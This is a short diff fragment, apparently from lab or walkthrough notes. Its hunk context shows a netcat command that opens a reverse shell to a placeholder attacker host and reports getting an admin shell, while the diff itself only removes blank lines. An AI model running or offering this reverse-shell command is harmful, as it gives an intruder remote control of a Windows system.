@@ -26,6 +26,3 @@ nc.exe ATTACKER 4444 -e cmd.exe
 
 Got Admin shell acess!
 
-
-
-
